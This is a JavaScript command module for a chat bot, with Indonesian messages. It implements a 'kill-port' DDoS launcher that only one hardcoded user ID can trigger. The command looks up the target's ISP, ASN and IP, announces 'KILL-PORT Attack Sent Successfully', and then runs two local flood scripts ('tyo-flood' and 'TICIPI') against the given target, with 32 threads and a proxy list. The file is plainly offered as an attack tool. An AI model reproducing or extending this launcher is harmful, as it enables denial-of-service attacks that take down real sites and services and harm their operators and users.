const axios = require("axios");
const url = require("url");
const path = require("path");
const { exec } = require("child_process");

const allowedId = 7818441356;

module.exports = {
  command: ["kill-port"],
  run: async ({ client, message }) => {
    const senderId = parseInt(message.sender?.userId || message.senderId?.userId || message.senderId);
    if (senderId !== allowedId) return;

    const rawText = message.message?.trim();
    const args = rawText.split(/\s+/);
    args.shift(); // hapus command "https"

    if (args.length < 3) {
      return client.sendMessage(message.chatId, {
        message: "❌ Masukkan target, port, dan durasi.\n\nContoh:\nkill-port https://example.com 443 60",
        replyTo: message.id,
      });
    }

    const [target, port, duration] = args;
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;

    const { data } = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    const info = data;

    const caption = `<blockquote>
✅ <b>KILL-PORT Attack Sent Successfully</b>
──────────────────────
🌐 <b>Host:</b> ${hostname}
📌 <b>Port:</b> ${port}
⏱️ <b>Duration:</b> ${duration}s
📡 <b>Method:</b> kill-port
──────────────────────
🏢 <b>ISP:</b> ${info.isp}
🏷️ <b>ASN:</b> ${info.as}
🌍 <b>IP:</b> ${info.query}
</blockquote>`;

    await client.sendMessage(message.chatId, {
      message: caption,
      parseMode: "html",
      replyTo: message.id,
    });
    const tyokx = path.join(__dirname, `../lib/cache/tyo-flood`);
    const scriptPath = path.join(__dirname, "../lib/cache/TICIPI");
    exec(`node ${scriptPath} ${target} ${duration} 32 2 proxy.txt`);
    exec(`node ${tyokx} ${target} ${duration} 32 8 proxy.txt`);
  },
};